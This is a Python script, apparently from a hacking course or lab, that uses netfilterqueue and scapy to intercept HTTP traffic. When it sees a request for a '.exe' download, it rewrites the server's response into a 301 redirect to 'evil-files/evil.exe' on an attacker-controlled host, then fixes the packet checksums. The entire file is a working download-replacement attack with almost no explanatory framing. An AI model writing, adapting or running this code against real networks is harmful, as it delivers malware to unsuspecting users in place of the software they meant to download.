import netfilterqueue
import scapy.all as scapy

ack_list = []
server_ip = "10.0.2.16"

# This method looks for a request to downlaod a .exe and change the response replacing another .exe through the ack
# seq number
def intercept_packet(packet):
    packet_to_intercept = scapy.IP(packet.get_payload())
    if packet_to_intercept.haslayer(scapy.Raw):  # HTTP
        if packet_to_intercept[scapy.TCP].dport == 80:   # It is an HTTP req
            if ".exe" in packet_to_intercept[scapy.Raw].load:  # Req to download .exe
                print("Download request...")
                ack_list.append(packet_to_intercept[scapy.TCP].ack)

        elif packet_to_intercept[scapy.TCP].sport == 80:  # Its si an HTTP response
            if packet_to_intercept[scapy.TCP].seq in ack_list:  # It is a response for a download req
                ack_list.remove(packet_to_intercept[scapy.TCP].seq)
                print("Changing download file...")
                packet_to_intercept[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://" + server_ip + \
                                                      "/evil-files/evil.exe\n\n"
                # Since we edited the packet, we need to recalculate checksum. We deleted it, and scapy will recalculate
                # for us
                del packet_to_intercept[scapy.IP].len
                del packet_to_intercept[scapy.IP].chksum
                del packet_to_intercept[scapy.TCP].chksum
                packet.set_payload(str(packet_to_intercept))

    packet.accept()


#  Trap packets in the queue so that we can intercept them and they won't be send
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, intercept_packet)
queue.run()
